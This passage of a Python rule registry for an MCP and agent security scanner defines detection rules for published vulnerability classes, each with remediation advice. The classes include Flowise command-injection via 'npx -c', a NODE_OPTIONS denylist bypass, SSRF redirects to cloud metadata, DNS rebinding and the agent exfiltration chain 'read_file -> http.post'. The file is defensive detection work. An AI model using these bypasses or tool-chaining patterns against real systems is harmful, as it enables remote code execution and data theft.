# ---------------------------------------------------------------------------
# Flowise MCP-adapter RCE (CVE-2026-40933 / GHSA-c9gw-hvqq-f33r)
#
# Authenticated RCE — npx with `-c` flag bypasses the allowlist. CVSS 10.0.
# Fixed in flowise 3.1.0 (verified via GHSA on 2026-04-20).
# Family: inherits from the Ox STDIO class already covered by
# AAK-STDIO-001; this is the Flowise-specific pin + flow-config check.
# ---------------------------------------------------------------------------

_r(
    "AAK-FLOWISE-001",
    "Flowise < 3.1.2 MCP adapter authenticated RCE",
    "Package manifest depends on `flowise` or `flowise-components` at "
    "version < 3.1.2, and/or a Flowise flow config (`.flowise/*.json`, "
    "`flows/*.json`) declares an MCP adapter node with `customFunction` "
    "or `runCode` sinks. The Custom-MCP feature is a recurring RCE class: "
    "CVE-2026-40933 (GHSA-c9gw-hvqq-f33r, CVSS 10.0) lets an authenticated "
    "attacker combine allowlisted commands like `npx` with execution flags "
    "such as `-c` for arbitrary OS command execution; CVE-2025-71336 "
    "(< 3.0.6, CVSS 9.8) is an unsandboxed RCE in the same feature; "
    "CVE-2026-56274 (< 3.1.2, CVSS 9.9) adds OS command injection via "
    "incomplete command-flag validation plus a regex bypass in local "
    "file-access restrictions; CVE-2026-58057 (< 3.1.3, CVSS 5.0) validates "
    "Custom-MCP stdio env vars against a *case-sensitive* denylist, so on "
    "Windows (case-insensitive env names) `node_options` slips past the "
    "NODE_OPTIONS entry and reaches `NODE_OPTIONS --require` code execution. "
    "Pin floor is 3.1.3 (highest fixed version) so 3.0.6–3.1.2 are still "
    "flagged. Same architectural class as Ox's original STDIO disclosure "
    "(see AAK-STDIO-001).",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade flowise and flowise-components to 3.1.3 or later. Audit "
    "every MCP adapter node in your flow configs; remove "
    "`customFunction`/`runCode` sinks unless they're validated against "
    "a strict argv allowlist, and treat env-var denylists as "
    "case-insensitive. See also AAK-STDIO-001 for the "
    "architectural-class detector.",
    sarif_name="FlowiseMcpAdapterRce",
    cve_references=["CVE-2026-40933", "CVE-2025-71336", "CVE-2026-56274", "CVE-2026-58057"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-RCE-04"],
    auto_fixable=True,
)


# ---------------------------------------------------------------------------
# Third-party OAuth-app risk surface (VERCEL-2026-04-19 class)
# ---------------------------------------------------------------------------

_r(
    "AAK-OAUTH-SCOPE-001",
    "Third-party OAuth client granted broad Workspace scopes",
    "A config file in this repo grants a non-first-party Google OAuth "
    "client broad Workspace scopes (admin.*, cloud-platform, drive, "
    "directory.*, gmail.modify/send). The April 19 2026 Vercel × "
    "Context.ai breach is the template: a single compromised third-"
    "party OAuth app with deployment-level scopes let attackers pivot "
    "into production. Explicitly allowlist trusted client IDs in "
    "`.aak-oauth-trust.yml`.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Review the granted scopes — drop admin.* / cloud-platform where "
    "possible. Add every legitimate third-party client_id to "
    "`.aak-oauth-trust.yml` under `trusted_client_ids:`. Rotate the "
    "consent if the client isn't recognised.",
    sarif_name="ThirdPartyOAuthBroadScope",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04"],
    incident_references=["VERCEL-2026-04-19"],
)

_r(
    "AAK-OAUTH-3P-001",
    "Repo depends on a third-party agent-platform SDK",
    "The project depends on an agent-platform SDK (context-ai, "
    "langsmith, helicone, langfuse, humanloop, MCP SDK). Informational "
    "finding so reviewers audit the vendor's OAuth-scope footprint "
    "before merging. Raised to MEDIUM because the April 19 2026 "
    "Vercel × Context.ai incident showed a single vendor compromise "
    "can turn into a production breach via transitive OAuth grants.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Pin the SDK to an exact version, audit the OAuth scopes it "
    "requests, and keep any deployment-level grants (Vercel, GCP, "
    "Workspace) in a secrets vault — never in a committed env file. "
    "See Vercel's bulletin for sensitive-env-var guidance: "
    "https://vercel.com/kb/bulletin/vercel-april-2026-security-incident",
    sarif_name="ThirdPartyAgentPlatformSdk",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04"],
    incident_references=["VERCEL-2026-04-19"],
)


# ---------------------------------------------------------------------------
# mcp-framework HTTP-body DoS (CVE-2026-39313 / GHSA: mcp-framework < 0.2.22).
# readRequestBody concatenates request body chunks into a single string with
# no cap — maxMessageSize is never consulted — so a single large POST to
# /mcp exhausts memory.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCPFRAME-001",
    "mcp-framework < 0.2.22 HTTP-body DoS",
    "Project depends on `mcp-framework` at a version < 0.2.22, or a TS/JS "
    "file implements an MCP HTTP transport that concatenates request "
    "body chunks into a string without consulting Content-Length or a "
    "`maxMessageSize` guard. CVE-2026-39313 lets an unauthenticated "
    "attacker crash the server with a single large POST to /mcp by "
    "exhausting process memory. Fixed in 0.2.22.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Upgrade `mcp-framework` to 0.2.22 or newer. For custom transports, "
    "enforce a hard body-size cap before accumulating chunks — reject "
    "early when `Content-Length` exceeds your `maxMessageSize`.",
    sarif_name="McpFrameworkHttpBodyDos",
    cve_references=["CVE-2026-39313"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-DOS-01"],
    aicm_references=["LOG-13"],
)


# ---------------------------------------------------------------------------
# Apache Doris MCP Server SQL injection (CVE-2025-66335, Doris MCP < 0.6.1).
# Published 2026-04-20. Query-context neutralization bypass in the adapter's
# tool layer lets crafted tool calls inject SQL.
# ---------------------------------------------------------------------------

_r(
    "AAK-DORIS-001",
    "apache-doris-mcp-server < 0.6.1 SQL injection",
    "Project depends on `apache-doris-mcp-server` at a version < 0.6.1. "
    "CVE-2025-66335 is a query-context neutralization bypass in the MCP "
    "adapter's tool layer — crafted tool arguments are concatenated into "
    "Doris SQL without a parameterized boundary, letting an LLM-driven "
    "tool call reach into arbitrary reads/writes. CVE-2025-66336 is a "
    "sibling SQL injection in a metadata query path (a user-controlled "
    "database name interpolated without the caller's authz context), same "
    "< 0.6.1 fixed line. Fixed in 0.6.1.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `apache-doris-mcp-server` to 0.6.1 or newer. Audit every "
    "tool the adapter exposes to confirm arguments flow through a "
    "parameterized query builder, never string concatenation.",
    sarif_name="DorisMcpSqlInjection",
    cve_references=["CVE-2025-66335", "CVE-2025-66336"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-02"],
    aicm_references=["AIS-07", "DSP-07"],
)


# ---------------------------------------------------------------------------
# SDK-level STDIO sanitization inheritance (OX-MCP-2026-04-15 incident class).
# Anthropic declined to CVE this — OX Security's "Mother of all AI supply
# chains" disclosure confirms the STDIO interface in the upstream MCP SDKs
# passes configuration to the OS as command execution by design. Downstream
# servers must add their own sanitizer.
# ---------------------------------------------------------------------------

_r(
    "AAK-ANTHROPIC-SDK-001",
    "MCP server built on the upstream SDK without STDIO sanitizer",
    "Repository declares a dependency on the upstream Anthropic / "
    "ModelContextProtocol SDK (Python `mcp` / `modelcontextprotocol`, "
    "TS `@modelcontextprotocol/sdk`, Java `io.modelcontextprotocol:*`, "
    "Rust `mcp` / `modelcontextprotocol`) and exposes a STDIO transport "
    "(`StdioServerTransport`, `stdio_server`, etc.) without a sanitizer "
    "on argv assembly. Anthropic declined to CVE this as working as "
    "designed — sanitization is the developer's responsibility. The OX "
    "Security disclosure on 2026-04-15 rolled up LiteLLM, LangChain and "
    "IBM LangFlow as downstream casualties of exactly this pattern. "
    "See also AAK-STDIO-001 for the sink-level detector.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Wrap every argv the STDIO transport builds in an allow-list "
    "sanitizer — `shlex.quote` in Python, `execFile` with an explicit "
    "argv array in Node, equivalent in Java/Rust. OR switch the "
    "transport off STDIO (`transports=['http']` / `['sse']`). If you "
    "have deliberately accepted the risk, add "
    "`accepts_stdio_risk: true` plus a `justification:` field in "
    "`.agent-audit-kit.yml`.",
    sarif_name="AnthropicSdkStdioSanitizer",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["OX-MCP-2026-04-15"],
    aicm_references=["AIS-07", "STA-08"],
)


# ---------------------------------------------------------------------------
# DNS-rebinding SDK class (CVE-2025-66414 / 66416, CVE-2026-35568, 2026-35577).
# April 2026 cluster: upstream MCP Python, Java, Apollo, TS SDKs shipped a
# StreamableHTTP transport that trusted the browser-supplied Host header,
# letting a malicious web page reach a loopback MCP server via DNS rebinding.
# ---------------------------------------------------------------------------

_r(
    "AAK-DNS-REBIND-001",
    "MCP StreamableHTTP transport without Host-header allow-list",
    "The upstream MCP Python, Java, Apollo and TypeScript SDKs shipped a "
    "StreamableHTTP transport that trusts the browser-supplied `Host` "
    "header. A malicious web page that a user visits can resolve a "
    "custom domain to 127.0.0.1 via DNS rebinding and reach a local MCP "
    "server, turning every browser tab into a remote-attack surface for "
    "stdio-grade tools. The upstream patch adds a Host allow-list; "
    "downstream servers embedding StreamableHTTP must enforce one too. "
    "See CVE-2025-66414 / CVE-2025-66416 (Python), CVE-2026-35568 (Java), "
    "CVE-2026-35577 (Apollo).",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Wrap the StreamableHTTP app with a Host-header allow-list. In "
    "Starlette / FastAPI attach `TrustedHostMiddleware(allowed_hosts=...)`; "
    "in Node attach an `allowedHosts:` option or a Host middleware; in "
    "Java/Apollo enable `HostHeaderFilter` / `allowedHosts` config. "
    "Alternatively upgrade the SDK to a patched version and pass through "
    "its host-validation option.",
    sarif_name="McpStreamableHttpDnsRebind",
    cve_references=[
        "CVE-2025-66414",
        "CVE-2025-66416",
        "CVE-2026-35568",
        "CVE-2026-35577",
    ],
    owasp_mcp_references=["MCP02:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-NETWORK-01"],
    incident_references=["MCP-DNS-REBIND-2026-04"],
)

_r(
    "AAK-DNS-REBIND-002",
    "Vulnerable MCP SDK version pinned (DNS-rebinding fix missing)",
    "A project dependency manifest (requirements.txt, pyproject.toml, "
    "package.json, pom.xml, build.gradle) pins an MCP SDK at a version "
    "below the DNS-rebinding fix. Patched versions: Python `mcp` >= "
    "1.23.0, TS `@modelcontextprotocol/sdk` >= 1.21.1, Java "
    "`io.modelcontextprotocol.sdk:mcp-core` >= 0.11.0, `@apollo/mcp-server` "
    ">= 1.7.0. Even if the project never serves over StreamableHTTP "
    "itself, transitive servers built on the SDK inherit the bug.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump the SDK to the patched version listed in the rule title. If a "
    "bump is not yet possible, ensure every transport surface has its own "
    "Host-header allow-list (see AAK-DNS-REBIND-001 remediation).",
    sarif_name="McpSdkDnsRebindPin",
    cve_references=[
        "CVE-2025-66414",
        "CVE-2025-66416",
        "CVE-2026-35568",
        "CVE-2026-35577",
    ],
    owasp_mcp_references=["MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-SUPPLY-01"],
    incident_references=["MCP-DNS-REBIND-2026-04"],
)


# ---------------------------------------------------------------------------
# Splunk MCP Server token-cleartext logging (CVE-2026-20205, splunk-mcp-server
# < 1.0.3). The server logged session tokens into the _internal index without
# redaction, exposing them to anyone with read access.
# ---------------------------------------------------------------------------

_r(
    "AAK-SPLUNK-TOKLOG-001",
    "Session token written to log sink in cleartext",
    "An MCP server, agent, or tool logs a session token, JWT, or Bearer "
    "credential through a generic log sink (logger.info / .warn / .error, "
    "print) without redaction. CVE-2026-20205 (splunk-mcp-server < 1.0.3) "
    "shipped this exact pattern — session tokens ended up in the Splunk "
    "`_internal` index, readable by anyone with index-read. Any token "
    "written to a log sink is also a supply-chain risk: the log file, "
    "shipper, and SIEM are now in scope for the token's blast radius.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Redact token-shaped values before logging. Never interpolate a raw "
    "`Authorization`, `Bearer`, JWT, `splunkd_session`, or `st-` credential "
    "into a log message. Pin `splunk-mcp-server >= 1.0.3`.",
    sarif_name="SplunkMcpTokenLog",
    cve_references=["CVE-2026-20205"],
    owasp_mcp_references=["MCP08:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-LEAK-01"],
    incident_references=["SVD-2026-0405"],
)


# ---------------------------------------------------------------------------
# GitHub Actions Immutable Action / SHA-pin (April 2026 Security Roadmap).
# Third-party Actions pinned by tag or branch are mutable — a supply-chain
# takeover of the Action's repo can re-tag a malicious revision under the
# same ref. GitHub's 2026 roadmap makes SHA pinning the default policy.
# ---------------------------------------------------------------------------

_r(
    "AAK-GHA-IMMUTABLE-001",
    "Third-party GitHub Action not pinned by full commit SHA",
    "A workflow in `.github/workflows/` uses a third-party Action "
    "(`owner/action@ref`) where `ref` is a tag or branch name instead of "
    "a 40-character commit SHA. A repo-takeover of the Action's publisher "
    "can re-point the tag to a malicious revision — the downstream repo "
    "consuming it will happily run the new code with `GITHUB_TOKEN` and "
    "write permissions. GitHub's April 2026 Security Roadmap ships "
    "Immutable Actions and makes SHA pinning the default policy.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Repin third-party Actions to a 40-character commit SHA and add a "
    "`# v1.2.3`-style trailing comment for humans. First-party Actions "
    "under `actions/` and `github/` are exempt (they now ship Immutable "
    "Actions). Dependabot will auto-bump SHA pins when `update-type: "
    "all` is set.",
    sarif_name="GhaNonShaPin",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-SUPPLY-02"],
    incident_references=["GHA-IMMUTABLE-2026-04"],
)


# ---------------------------------------------------------------------------
# excel-mcp-server path traversal (CVE-2026-40576, excel-mcp-server <= 0.1.7).
# Documented SSE / Streamable-HTTP transport with 0.0.0.0 bind and no
# filepath validation in get_excel_path().
# ---------------------------------------------------------------------------

_r(
    "AAK-EXCEL-MCP-001",
    "excel-mcp-server <= 0.1.7 path traversal",
    "Project depends on `excel-mcp-server` at a version <= 0.1.7. "
    "CVE-2026-40576 is a path-traversal in the server's `get_excel_path()` "
    "helper — absolute paths pass through unchecked, relative paths are "
    "joined without resolving-and-validating the result. Combined with the "
    "default 0.0.0.0 bind + zero authentication on SSE / Streamable-HTTP, "
    "any unauthenticated network peer can read, write or overwrite files "
    "anywhere on the host. Fixed in 0.1.8.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `excel-mcp-server` to 0.1.8 or later. Until the bump is in, "
    "bind the server to 127.0.0.1 and front it with an auth proxy.",
    sarif_name="ExcelMcpPathTraversal",
    cve_references=["CVE-2026-40576"],
    owasp_mcp_references=["MCP02:2025", "MCP09:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-03"],
)


# ---------------------------------------------------------------------------
# Next AI Draw.io body-accumulation DoS (CVE-2026-40608, next-ai-draw-io
# < 0.4.15). Same class as AAK-MCPFRAME-001 — unbounded body accumulation
# in the sidecar HTTP handlers.
# ---------------------------------------------------------------------------

_r(
    "AAK-NEXT-AI-DRAW-001",
    "next-ai-draw-io < 0.4.15 body-accumulation DoS",
    "Project depends on `next-ai-draw-io` at a version below 0.4.15. "
    "CVE-2026-40608 is a body-accumulation OOM in the embedded HTTP "
    "sidecar's /api/state, /api/restore and /api/history-svg handlers — "
    "the entire request body is concatenated into a JavaScript string "
    "without a size cap, so a single ~500 MiB POST exhausts V8 heap and "
    "crashes the MCP server. Same DoS class as AAK-MCPFRAME-001. "
    "Fixed in 0.4.15.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Upgrade `next-ai-draw-io` to 0.4.15 or later. For custom transports "
    "that replicate the pattern, enforce a hard body-size cap before "
    "accumulating chunks and reject early when `Content-Length` exceeds "
    "the cap.",
    sarif_name="NextAiDrawBodyDos",
    cve_references=["CVE-2026-40608"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-DOS-02"],
)


# ---------------------------------------------------------------------------
# LangChain SSRF redirect bypass (CVE-2026-41481, langchain-text-splitters
# < 1.1.2). HTMLHeaderTextSplitter.split_text_from_url() validates the
# initial URL via validate_safe_url() and then fetches with redirects on
# by default — so a 302 from an attacker-controlled host into the cloud
# metadata endpoint reaches the parsed Document.
# ---------------------------------------------------------------------------

_r(
    "AAK-LANGCHAIN-SSRF-REDIR-001",
    "Validate-then-fetch SSRF (redirects enabled past allow-list)",
    "A function calls a known SSRF guard helper "
    "(`validate_safe_url`, `is_safe_url`, `validateSafeUrl`, etc.) and "
    "then fetches the same URL via `requests.get`, `httpx.get`, "
    "`urllib.request.urlopen`, `fetch`, or similar without disabling "
    "redirects. The allow-list fires once on the initial URL, but "
    "`requests` follows 3xx by default — a redirect into "
    "`http://169.254.169.254/...`, `http://localhost`, or another "
    "blocked target bypasses the guard and pulls the response back into "
    "the calling context. CVE-2026-41481 is the in-tree example "
    "(langchain-text-splitters < 1.1.2). Same shape applies in any "
    "agent-tooling code that does validate→fetch without "
    "`allow_redirects=False` / `follow_redirects=False` / "
    "`redirect: 'manual'`.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Disable redirect following on the fetch call: "
    "`requests.get(url, allow_redirects=False)`, "
    "`httpx.get(url, follow_redirects=False)`, "
    "`fetch(url, { redirect: 'manual' })`. Or revalidate the URL on "
    "every redirect hop. For `langchain-text-splitters`, bump to "
    ">= 1.1.2.",
    sarif_name="LangchainSsrfRedirect",
    cve_references=["CVE-2026-41481"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-NETWORK-02"],
    incident_references=["GHSA-fv5p-p927-qmxr"],
)


# ---------------------------------------------------------------------------
# TOCTOU / DNS-rebind in URL allow-list (CVE-2026-41488, langchain-openai
# < 1.1.14). _url_to_size() validates a URL, then re-resolves DNS in a
# separate fetch — leaving a window for a hostname to rotate from a
# public IP to a private one between the two operations.
# ---------------------------------------------------------------------------

_r(
    "AAK-SSRF-TOCTOU-001",
    "Validate-then-fetch DNS-rebind / TOCTOU on URL allow-list",
    "A function validates a URL via an SSRF guard, then performs a "
    "separate network fetch that triggers an independent DNS "
    "resolution. Between the two resolutions a malicious hostname can "
    "rotate from a public IP to a private/localhost/cloud-metadata IP "
    "(DNS rebinding) — bypassing the allow-list. CVE-2026-41488 "
    "(langchain-openai `_url_to_size`) is the canonical example. The "
    "fix is to resolve once, pin the IP, and reuse the same `Session` / "
    "`HTTPAdapter` for the fetch — or drive the allow-list check on the "
    "resolved IP instead of the hostname.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Resolve the hostname once with `socket.getaddrinfo`, validate the "
    "resolved IP against the allow-list, then make the fetch over a "
    "`Session` / connection pinned to that IP (e.g. via `Host:` header "
    "+ explicit IP, custom `HTTPAdapter`, or `pinned_ip`-style helper). "
    "Pin `langchain-openai >= 1.1.14`.",
    sarif_name="UrlAllowListToctou",
    cve_references=["CVE-2026-41488"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-NETWORK-03"],
    incident_references=["GHSA-r7w7-9xr2-qq2r"],
)


# ---------------------------------------------------------------------------
# Azure MCP missing-auth (CVE-2026-32211). Server published with no
# authentication on the MCP endpoint; consumer-side check is "your
# .mcp.json points at it without an Authorization header / mTLS / Azure-AD".
# ---------------------------------------------------------------------------

_r(
    "AAK-AZURE-MCP-001",
    "Azure MCP server consumed without authentication",
    "An `.mcp.json` / `.azure-mcp/` config references an Azure MCP "
    "server endpoint without an `Authorization:` header, mTLS client "
    "cert, or Azure-AD token-exchange. CVE-2026-32211 (CVSS 9.1) "
    "documented the server-side default of no auth on the MCP "
    "endpoint; downstream agents must add a transport-layer credential "
    "or risk session-hijack / tool-impersonation by anyone reachable "
    "on the network.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add an `Authorization` header with an Azure-AD token (preferred), "
    "an mTLS client certificate, or a static API key obtained from a "
    "secrets vault. Azure-AD managed identities or workload identity "
    "federation are the documented production paths.",
    sarif_name="AzureMcpMissingAuth",
    cve_references=["CVE-2026-32211"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
    incident_references=["MSRC-2026-04-03-AZUREMCP"],
)


# ---------------------------------------------------------------------------
# Toxic-flow scoring (Snyk Agent Scan parity).
# ---------------------------------------------------------------------------

_r(
    "AAK-TOXICFLOW-001",
    "Toxic flow: sensitive source paired with external sink",
    "An agent project exposes both a sensitive source tool (filesystem "
    "read, secrets read, database query) and an external sink tool "
    "(HTTP POST, email send, git push) without an explicit "
    "`.aak-toxic-flow-trust.yml` allow-list entry. Even if each tool "
    "is individually safe, the LLM can chain them — the canonical "
    "exfil pattern is `read_file -> http.post`. Suppress with an "
    "allow-list when the pairing is a documented product feature.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Add the source/sink pair to `.aak-toxic-flow-trust.yml` with a "
    "`justification:` field, scope the source tool to a directory the "
    "sink cannot reach, or remove one side of the pair. Run "
    "`agent-audit-kit toxic-flow --explain` to see the full graph.",
    sarif_name="ToxicFlowSourceSink",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI02", "ASI09"],
    adversa_references=["ADV-CHAIN-01"],
)


# ---------------------------------------------------------------------------
# OX MCP STDIO architectural class (Apr 2026 reframe). 8 CVEs trace to
# StdioServerParameters(command=<network_input>) across the upstream MCP
# Python / TS / Java / Rust SDKs. AAK-STDIO-001 detects the broader
# subprocess(shell=True) sink shape; this rule family targets the
# SDK-named API specifically — same root cause, different detector.
# ---------------------------------------------------------------------------

_OX_MCP_STDIO_CVES = [
    "CVE-2026-30615",
    "CVE-2026-30617",
    "CVE-2026-30623",
    "CVE-2026-22252",
    "CVE-2026-22688",
    "CVE-2026-33224",
    "CVE-2026-40933",
    "CVE-2026-6980",
]

_r(
    "AAK-MCP-STDIO-CMD-INJ-001",
    "MCP StdioServerParameters built from network-controlled input (Python)",
    "A Python function calls `StdioServerParameters(command=..., args=...)` "
    "from `mcp.client.stdio` / `modelcontextprotocol.client` while also "
    "reading from a network-controlled source (request body, fetched "
    "JSON, environment variable wired to a webhook, untrusted YAML). "
    "The OX MCP April-2026 architectural class makes this exploitable: "
    "the SDK executes whatever ends up in `command`/`args` verbatim. "
    "See AAK-STDIO-001 for the broader sink-pattern detector; this rule "
    "is the SDK-named-API config-side counterpart.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Never build `StdioServerParameters.command` / `.args` from a "
    "network-controlled value. Pin `command` to a constant binary path "
    "and validate `args` against an allow-list. If a tenant must pick "
    "the server, look the choice up in a server-side allow-list keyed "
    "by tenant identity, not by a free-form string in the request.",
    sarif_name="McpStdioServerParamsTainted",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-002",
    "MCP StdioClientTransport built from network-controlled input (TypeScript)",
    "A TypeScript / JavaScript file constructs "
    "`new StdioClientTransport({ command, args })` from "
    "`@modelcontextprotocol/sdk/client/stdio` shortly after a "
    "network-controlled source (`req.body`, `await fetch(...).then(...)`, "
    "`process.env.<NETWORK_VAR>`, `JSON.parse(...)`). Same OX MCP "
    "April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `command` to a constant binary path; validate `args` against "
    "an allow-list before passing them into the transport. Never feed "
    "fetched JSON or `req.body` directly into the transport options.",
    sarif_name="McpStdioClientTransportTainted",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-003",
    "MCP StdioServerParameters built from network-controlled input (Java)",
    "A Java file constructs "
    "`StdioServerParameters.Builder().command(...).args(...).build()` "
    "from `io.modelcontextprotocol.sdk.client.stdio` after a "
    "network-controlled source (`HttpServletRequest`, "
    "`RestTemplate.getForObject`, `WebClient`, "
    "`ObjectMapper.readValue(...)`, `System.getenv(...)`). Same OX MCP "
    "April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `command()` to a constant; validate `args()` against an "
    "allow-list. If using Spring, prefer `@Value`-injected configuration "
    "over per-request resolution.",
    sarif_name="McpStdioServerParamsTaintedJava",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-004",
    "MCP STDIO command spawned from network-controlled input (Rust)",
    "A Rust file invokes `tokio::process::Command::new(...)` or "
    "`std::process::Command::new(...)` in a module that imports "
    "`mcp_sdk` / `modelcontextprotocol` after a network-controlled "
    "source (`reqwest`, `serde_json::from_str`, `std::env::var`, "
    "`hyper::body`, `actix_web::web::Json`, `axum::extract::Json`). "
    "Same OX MCP April-2026 class. NOTE: this rule is regex-only "
    "until #22 lands tree-sitter-rust; expect ~10% false-positive rate "
    "on macro-heavy code.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin the `Command::new(...)` argument to a constant binary path "
    "and validate any subsequent `.arg(...)` values. Or move the "
    "process-spawn out of the request path entirely.",
    sarif_name="McpStdioCommandTaintedRust",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
)


# ---------------------------------------------------------------------------
# Marketplace-fetch → StdioServerParameters single-line pattern.
# Cloudflare's MCP-defender reframe (2026-04-25) called this out as the
# highest-risk single-line bug in the wild.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-MARKETPLACE-CONFIG-FETCH-001",
    "MCP server config fetched from a marketplace URL and spawned",
    "A function fetches a remote URL "
    "(`requests.get` / `httpx.get` / `urllib.request.urlopen` / "
    "`fetch`) and pipes the JSON / text return value into "
    "`StdioServerParameters(...)` or "
    "`new StdioClientTransport({...})` in the same function or one "
    "frame deep. The OX MCP April-2026 disclosure plus Cloudflare's "
    "MCP-defender reframe both call this out as the canonical "
    "supply-chain inversion: a marketplace compromise becomes "
    "client-side RCE on every consumer at the next refresh. Suppress "
    "with an entry in `.aak-mcp-marketplace-trust.yml`.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Never feed a fetched marketplace manifest directly into "
    "`StdioServerParameters`. Cache the response, sign it, verify the "
    "signature on load, and pin `command` to a constant binary path "
    "regardless of what the manifest says. If the manifest URL is "
    "trusted (e.g. an internal artifact registry), add it to "
    "`.aak-mcp-marketplace-trust.yml` with a `justification:` field.",
    sarif_name="McpMarketplaceConfigFetch",
    owasp_mcp_references=["MCP05:2025", "MCP09:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-SUPPLY-03"],
    incident_references=["OX-MCP-2026-04-25", "CLOUDFLARE-MCP-DEFENDER-2026-04-25"],
)


# ---------------------------------------------------------------------------
# Server-author Azure MCP missing-auth (CVE-2026-32211 server-side).
# v0.3.5's AAK-AZURE-MCP-001 detects the consumer side; this rule fires
# on repos that publish an Azure-MCP-shaped server without auth
# middleware on /mcp/* routes.
# ---------------------------------------------------------------------------

_r(
    "AAK-AZURE-MCP-NOAUTH-001",
    "Azure MCP server published without auth middleware on /mcp routes",
    "Repository publishes an Azure-MCP-shaped server "
    "(`@azure/mcp-server`, `azure-mcp-server` Python package, or "
    "`mcp-server-azure` keywords in `pyproject.toml` / `package.json`) "
    "and exposes one or more `/mcp/*` route handlers without an auth "
    "middleware on the same route. CVE-2026-32211 (CVSS 9.1) is the "
    "server-side default that AAK-AZURE-MCP-001 catches on the "
    "consumer side; this rule is the upstream pair so server authors "
    "ship secure defaults.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add an auth middleware to every `/mcp/*` route — Azure-AD JWT "
    "validation, `client_credentials`, mTLS, or a vault-issued API "
    "key checked at request time. Reject unauthenticated requests "
    "with HTTP 401 *before* dispatching to the MCP handler.",
    sarif_name="AzureMcpServerNoAuth",
    cve_references=["CVE-2026-32211"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-02"],
    incident_references=["MSRC-2026-04-03-AZUREMCP"],
)


# ---------------------------------------------------------------------------
# LMDeploy VL image-loader SSRF (CVE-2026-33626, GHSA published 2026-04-25).
# Pin info will be tightened once NVD enriches.
# ---------------------------------------------------------------------------

_r(
    "AAK-LMDEPLOY-VL-SSRF-001",
    "LMDeploy VL image loader fetches user-controlled URLs without allow-list",
    "A vision-language pipeline calls `lmdeploy.serve.vl_engine.*` "
    "(or framework-equivalent) preprocessing helpers with a URL "
    "argument that is not validated against an allow-list. CVE-2026-33626 "
    "(GHSA-only at time of v0.3.6 cut — NVD enrichment pending) "
